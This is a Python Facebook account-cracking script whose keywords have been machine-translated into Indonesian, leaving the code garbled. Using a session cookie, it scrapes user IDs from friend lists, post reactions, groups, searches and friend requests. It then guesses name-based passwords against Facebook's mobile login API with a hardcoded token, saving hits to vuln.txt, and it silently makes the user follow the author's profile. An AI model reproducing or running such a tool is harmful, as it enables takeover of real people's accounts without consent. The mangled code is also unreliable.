#Update 14/10/2020 (18:36)
#Recode Mulu asu tinggal pake apa susahnya: v
impor os, sys, waktu, permintaan, json, re
dari bs4 import BeautifulSoup sebagai parser
dari waktu tidur impor
dari concurrent.futures, impor ThreadPoolExecutor
dari colorama import init, Fore, Back
B = Fore.BLUE
W = Kedepan PUTIH
C = Kedepan.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Kedepan. KUNING
id = []
hitung = 0
hasil = 0
chek = 0
mati = 0
cek = []
vuln = []
mbasic = "https://mbasic.facebook.com {}"
def jelas ():
    os.system ('clear')
def baner ():    
    cetak (f '' '
{B} ╔═╗ {W} ┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─ {B} ╔╦╗ {W} ┌┐ ┌─┐
{B} ╠╣ {W} ├─┤│ ├┤ ├┴┐│ ││ │├┴┐ {R} ─── {B} ║║║ {W} ├┴┐├┤ 
{B} ╚ {W} ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴ {B} ╩ ╩ {W} └─┘└ '' ')
    print ('' + Back.BLUE + Fore.BLACK + 'Creator: Mr.xxxzzz \ 033 [00m')
    mencetak()

def masuk ():
    mencoba:
          cek = open ("cookies"). read ()
    kecuali FileNotFoundError:
          cek = masukan ("\ 033 [00mCookies: \ 033 [1; 96m")
    cek = {"cookie": cek}
    ismi = ses.get (mbasic.format ("/ me", verifikasi = False), cookie = cek) .content
    jika "mbasic_logout_button" di str (ismi):
        if "Apa yang Anda anggap Anda sekarang" di str (ismi):
            dengan open ("cookies", "w") sebagai f:
                 f.write (cek ["cookie"])
        lain:
            mencoba:
                 requests.get (mbasic.format (parser (ismi, "html.parser"). find ("a", string = "Bahasa Indonesia") ["href"]), cookies = cek)
            kecuali:
                 lulus
        mencoba:
             ikuti = parser (requests.get (mbasic.format ("/ xzcoder.xzcoder"), cookies = cek) .content, "html.parser"). temukan ("a", string = "Ikuti") ["href" ]
             ses.get (mbasic.format (ikuti), cookies = cek)
        kecuali:
             lulus
        kembalikan cek ["cookie"]
    lain:
        cetak ('\ 033 [00mCookies \ 033 [91mInvalid \ 033 [00m')
        waktu tidur (1)
        os.system ('python fb.py')
def nid ():
    r = ses.get (mbasic.format ('/ me'), cookies = kukis) .text
    name = re.findall (r '<title> (. *?) </title>', r) [0]
    uid = re.findall (r'name = "target" value = "(. *?)" ', r) [0]
    cetak ("\ 033 [00mName \ 033 [91m: \ 033 [93m" + nama)
    cetak ("\ 033 [00mID \ 033 [91m: \ 033 [93m" + uid)
    cetak ('\ 033 [91m <\ 033 [90m --------------------- \ 033 [91m> \ 033 [00m')
def temanid (url):
    req = requests.get (url, cookies = kukis) .content
    getuser = re.findall ('middle "> <a class=".." href="(.*?)"> (. *?) </a>', str (req))
    untuk x di getuser:
        jika 'profil' dalam x [0]:
            id.append (x [1] + '|' + re.findall ("= (\ d *)?", str (x [0])) [0])
        elif 'teman' di x:
            terus
        lain:
            id.append (x [1] + '|' + x [0] .split ('/') [1] .split ('?') [0])
        cetak (f '\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}', end = '')
    jika 'Lihat Teman Lain' di str (req):
        temanid (mbasic.format (parser (req, 'html.parser'). find ('a', string = 'Lihat Teman Lain') ['href']))
    kembali id
def targetteman (url):
    req = requests.get (url, cookies = kukis) .content
    getuser = re.findall ('middle "> <a class=".." href="(.*?)"> (. *?) </a>', str (req))
    untuk x di getuser:
        jika 'profil' dalam x [0]:
            id.append (x [1] + '|' + re.findall ("= (\ d *)?", str (x [0])) [0])
        elif 'teman' di x:
            terus
        lain:
            id.append (x [1] + '|' + x [0] .split ('/') [1] .split ('?') [0])
        cetak (f '\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}', end = '')
    jika 'Lihat Teman Lain' di str (req):
        targetteman (mbasic.format (parser (req, 'html.parser'). find ('a', string = 'Lihat Teman Lain') ['href']))
    kembali id
def seperti (url):
    mencoba:
        req = requests.get (url, cookies = kukis) .content
        lk = re.findall (r'href = "(/ ufi. *?)" ', str (req)) [0]
        aws = getlike (mbasic.format (lk))
        kembali aws
    kecuali:
        cetak ('\ 033 [91mFailed To Crack \ 033 [00m')
        tidur (1)
        Tidak bisa()
def getlike (react):
    like = requests.get (react, cookies = kukis) .content
    lkusr = re.findall ('class = "b."> <a href="(.*?)"> (. *?) </a> </h3>', str (seperti))
    untuk pengguna di lkusr:
        jika 'profil' di pengguna [0]:
            id.append (pengguna [1] + "|" + re.findall ("= (\ d *)", str (pengguna [0])) [0])
        lain:
            id.append (pengguna [1] + "|" + pengguna [0] .split ('/') [1])
        cetak (f '\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}', end = '')
    jika 'Lihat Selengkapnya' di str (like):
        getlike (mbasic.format (parser (like, 'html.parser'). find ('a', string = "Lihat Selengkapnya") ["href"]))
    kembali id 
def grupid (url):
    req = requests.get (url, cookies = kukis) .content
    pengguna = re.findall (r'a class = ".." href = "/(.*?)"> (. *?) </a> ', str (req))
    untuk pengguna di pengguna:
        jika "profil" di pengguna [0]:
            id.append (pengguna [1] + "|" + re.findall ('id = (\ d *)', str (pengguna [0])) [0])
        lain:
            id.append (pengguna [1] + "|" + pengguna [0])
        cetak (f '\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}', end = '')
    if "Lihat Selengkapnya" di str (req):
        grupid (mbasic.format (parser (req, "html.parser"). find ("a", string = "Lihat Selengkapnya") ["href"]))
    kembali id
cari def (url):
    req = requests.get (url, cookies = kukis) .content
    users = re.findall (r'class = "s cc"> <a href="(.*?)"> <div class = ".."> <div class = ".."> (. *?) </div> </div> ', str (req))
    untuk pengguna di pengguna:
        jika "profil" di pengguna [0]:
            id.append (pengguna [1] + "|" + re.findall ("id = (\ d *)", str (pengguna [0])) [0])
        lain:
            id.append (pengguna [1] + "|" + pengguna [0] .split ("?") [0])
        cetak (f '\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}', end = '')
    jika "Lihat Hasil Selanjutnya" di str (req):
        cari (parser (req, 'html.parser'). temukan ("a", string = "Lihat Hasil Selanjutnya") ["href"])
    kembali id
def kmn (url):
    req = requests.get (url, cookies = kukis) .content
    users = re.findall (r'middle "> <a class=".." href="(.*?)"> (. *?) </a> ', str (req))
    untuk pengguna di pengguna:
        jika "mbasic" di pengguna [0]:
            id.append (pengguna [1] + '|' + re.findall ("uid = (\ d *)", str (pengguna [0])) [0])
        lain:
            id.append (pengguna [1] + '|' + re.findall ("= (\ d *)", str (pengguna [0])) [0])
        cetak (f "\ r \ 033 [00mTotal ID: \ 033 [93m {str (len (id))}", end = "")
    jika "Lihat selengkapnya" di str (req):
        kmn (mbasic.format (parser (req, "html.parser"). find ("a", string = "Lihat selengkapnya") ["href"]))
    kembali id
def login (nama pengguna, kata sandi, cek = False):
          global die, result, chek, count
          b = "350685531728% 7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': nama pengguna,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get (api, params = params)
          jika 'EAA' di response.text:
              cetak (f "\ r \ 033 [00m [\ 033 [1; 32m✓ \ 033 [00m] \ 033 [1; 32m {nama pengguna} \ 033 [90m | \ 033 [1; 32m {sandi}", end = "")
              mencetak()
              hasil + = 1
              jika cek:
                      vuln.append (nama pengguna + "|" + kata sandi)
              lain:
                      dengan open ('vuln.txt', 'a') sebagai f:
                           f.write (nama pengguna + '|' + sandi + '\ n')
          elif 'www.facebook.com' di response.json () ['error_msg']:
                cetak (f "\ r \ 033 [00m [\ 033 [1; 91mx \ 033 [00m] \ 033 [1; 33m {username} \ 033 [90m | \ 033 [1; 33m {password}", end = " ")
                mencetak()
                chek + = 1
                jika cek:
                      check.append (nama pengguna + "|" + kata sandi)
                lain:
                      dengan open ('check.txt', 'a') sebagai f:
                           f.write (nama pengguna + '|' + sandi + '\ n')
          lain:
                mati + = 1
          tk = ['\ 033 [1; 97m #', '\ 033 [1; 96m #', '\ 033 [1; 97m #', '\ 033 [1; 91m #']
          untuk o dalam tk:
                     cetak (f "\ r \ 033 [00m [{o} \ 033 [00m] Life: \ 033 [1; 92m {str (result)} \ 033 [00mCheck: \ 033 [1; 93m {str (chek)} \ 033 [00mDie: \ 033 [1; 91m {str (die)} \ 033 [00m ", end =" ")
                     waktu tidur (0,2)
menu def ():
    bersih()
    baner ()
    nid ()
    mencetak('''
\ 033 [93m1). \ 033 [00mCrack Dari Teman
\ 033 [93m2). \ 033 [00mCrack Dari Sasaran Teman
\ 033 [93m3). \ 033 [00mCrack Dari React Post
\ 033 [93m4). \ 033 [00mCrack Dari Grup
\ 033 [93m5). \ 033 [00mCrack Dari Pencarian
\ 033 [93m6). \ 033 [00mCrack Dari Permintaan Teman
\ 033 [93m0). \ 033 [00mKeluar '' ')
    pilih_menu ()
def pilih_menu ():
    ff = masukan ('\ 033 [00m >> \ 033 [93m')
    jika ff == '1':
       bersih()
       baner ()
       nid ()
       usr = parser (ses.get (mbasic.format ('/ me'), cookies = kukis) .content, 'html.parser'). find ('a', string = 'Teman')
       namapengguna = temanid (mbasic.format (usr ['href']))
       dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
            untuk pengguna dalam nama pengguna:
                aa = user.split ('|')
                bb = aa [0] .split ('')
                untuk x di bb:
                    litpas = [
                         str (x) + '123',
                         str (x) + '1234',
                         str (x) + '12345',
                         str (x) + '123456'
                         ]
                    litpas.append ('Sayang')
                    litpas.append ('Bangsat')
                    litpas.append ('Kontol')
                    litpas.append ('Anjing')
                    untuk passw dalam set (litpas):
                        ex.submit (login, (aa [1]), (passw))
       cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '2':
       bersih()
       baner ()
       nid ()
       asw = input ('\ 033 [00mTarget Pengguna: \ 033 [93m')
       jika asw.isdigit ():
          asw = '/ profile.php? id =' + asw
       lain:
          asw = '/' + asw
       mencoba:
           usr = parser (ses.get (mbasic.format (asw), cookies = kukis) .content, 'html.parser'). find ('a', string = 'Teman')
           namapengguna = targetteman (mbasic.format (usr ["href"]))
       kecuali TypeError:
           print ('\ 033 [91mUser Tidak Ditemukan \ 033 [00m')
           tidur (1)
           Tidak bisa()
       dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
            untuk pengguna dalam nama pengguna:
                aa = user.split ('|')
                bb = aa [0] .split ('')
                untuk x di bb:
                    litpas = [
                         str (x) + '123',
                         str (x) + '1234',
                         str (x) + '12345',
                         str (x) + '123456'
                         ]
                    litpas.append ('Sayang')
                    litpas.append ('Bangsat')
                    litpas.append ('Kontol')
                    litpas.append ('Anjing')
                    untuk passw dalam set (litpas):
                        ex.submit (login, (aa [1]), (passw))
       cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '3':
         bersih()
         baner ()
         nid ()
         asw = masukan ('\ 033 [00mPost? Url: \ 033 [93m')
         jika 'www.facebook' di asw:
             asw = asw.replace ('www.facebook', 'mbasic.facebook')
         elif 'm.facebook.com' di asw:
             asw = asw.replace ('m.facebook.com', 'mbasic.facebook.com')
         elif asw == '':
             cetak ('\ 033 [91mDont Be Empty! \ 033 [00m')
             tidur (1)
             Tidak bisa()
         nama pengguna = suka (asw)
         dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
              untuk pengguna dalam nama pengguna:
                  aa = user.split ('|')
                  bb = aa [0] .split ('')
                  untuk x di bb:
                      litpas = [
                           str (x) + '123',
                           str (x) + '1234',
                           str (x) + '12345',
                           str (x) + '123456'
                           ]
                      litpas.append ('Sayang')
                      litpas.append ('Bangsat')
                      litpas.append ('Kontol')
                      litpas.append ('Anjing')
                      litpas.append ('786786')
                      untuk passw dalam set (litpas):
                          ex.submit (login, (aa [1]), (passw))
         cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '4':
         bersih()
         baner ()
         nid ()
         asw = input ('\ 033 [00mID Grup: \ 033 [93m')
         nama pengguna = grupid (mbasic.format ('/ browse / group / members /? id =' + asw))
         dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
              untuk pengguna dalam nama pengguna:
                  aa = user.split ('|')
                  bb = aa [0] .split ('')
                  untuk x di bb:
                      litpas = [
                           str (x) + '123',
                           str (x) + '1234',
                           str (x) + '12345',
                           str (x) + '123456'
                           ]
                      litpas.append ('Sayang')
                      litpas.append ('Bangsat')
                      litpas.append ('Kontol')
                      litpas.append ('Anjing')
                      litpas.append ('786786')
                      untuk passw dalam set (litpas):
                          ex.submit (login, (aa [1]), (passw))
         cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '5':
         bersih()
         baner ()
         nid ()
         asw = masukan ('\ 033 [00mQuery: \ 033 [93m')
         nama pengguna = pencarian (mbasic.format ('/ search / people /? q =' + asw))
         dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
              untuk pengguna dalam nama pengguna:
                  aa = user.split ('|')
                  bb = aa [0] .split ('')
                  untuk x di bb:
                      litpas = [
                           str (x) + '123',
                           str (x) + '1234',
                           str (x) + '12345',
                           str (x) + '123456'
                           ]
                      litpas.append ('Sayang')
                      litpas.append ('Bangsat')
                      litpas.append ('Kontol')
                      litpas.append ('Anjing')
                      litpas.append ('786786')
                      untuk passw dalam set (litpas):
                          ex.submit (login, (aa [1]), (passw))
         cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '6':
         bersih()
         baner ()
         nid ()
         nama pengguna = kmn (mbasic.format ('/ teman / pusat / permintaan / # teman_center_main'))
         dengan ThreadPoolExecutor (max_workers = 30) sebagai contoh:
              untuk pengguna dalam nama pengguna:
                  aa = user.split ('|')
                  bb = aa [0] .split ('')
                  untuk x di bb:
                      litpas = [
                           str (x) + '123',
                           str (x) + '1234',
                           str (x) + '12345',
                           str (x) + '123456'
                           ]
                      litpas.append ('Sayang')
                      litpas.append ('Bangsat')
                      litpas.append ('Kontol')
                      litpas.append ('Anjing')
                      untuk passw dalam set (litpas):
                          ex.submit (login, (aa [1]), (passw))
         cetak ('\ n \ 033 [00m [\ 033 [96m * \ 033 [00m] Selesai.')
    elif ff == '0':
         sys.exit ('\ 033 [1; 97mTerima Kasih Telah Menggunakan Alat Saya \ n \ 033 [91mexit \ 033 [00m')
    lain:
         print ('\ 033 [91mWrong Input! \ 033 [00m')
         tidur (1)
         Tidak bisa()
jika __name __ == "__ main__":
     bersih()
     baner ()
     ses = permintaan.Session ()
     kuki = masuk ()
     kukis = {'cookie': kuki}
     Tidak bisa()
     